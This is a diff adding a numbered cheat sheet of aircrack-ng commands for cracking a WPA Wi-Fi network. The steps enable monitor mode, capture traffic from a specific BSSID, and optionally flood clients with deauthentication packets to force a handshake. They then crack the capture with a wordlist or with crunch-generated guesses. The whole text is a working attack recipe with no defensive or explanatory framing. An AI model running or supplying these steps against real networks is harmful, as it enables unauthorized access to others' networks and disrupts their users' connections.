@@ -1,0 +1,14 @@
+1. airmon-ng check kill
+
+2. ifconfig wlan0 down
+
+3. airmon-ng start wlan0
+
+4. airodump-ng mon0
+
+5. airodump-ng --bssid 08:86:30:74:22:76 -c 6 --write WPAcrack mon0
+
+6. [optional] aireplay-ng --deauth 100 --ignore-negative-one -e {ESSID} -a 08:86:30:74:22:76 mon0
+
+7.a. aircrack-ng WPAcrack-01.cap -w darkc0de.lst
+7.b. crunch 5 10 'abcdef ghi...' | aircrack-ng WPAcrack-01.cap -w - -e {ESDID}
